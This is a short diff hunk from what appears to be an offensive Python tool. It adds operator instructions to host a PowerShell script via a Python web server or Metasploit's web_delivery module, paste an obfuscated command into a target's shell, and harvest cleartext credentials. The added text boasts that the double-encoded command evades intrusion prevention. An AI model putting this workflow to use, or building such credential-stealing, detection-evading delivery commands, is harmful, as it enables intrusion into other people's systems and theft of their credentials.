@@ -174,7 +174,17 @@ def main():
         except Exception as e:
             print("[!] No IP address found on interface eth0")
 
+    instructions = '''
+    [*] Place the PowerShell script ''' + payload + ''' in an empty directory.
+    [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.
+    [*] Or start-up your Metasploit module exploit/multi/script/web_delivery.
+    [*] Then copy and paste the following command into the target boxes command shell.
+    [*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
+    [*] This double encoded script should bypass almost all forms of IPS and it drops no payloads
+    '''
+
     x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+    print(instructions)
     print(x.return_command())
 if __name__ == '__main__':
     main()
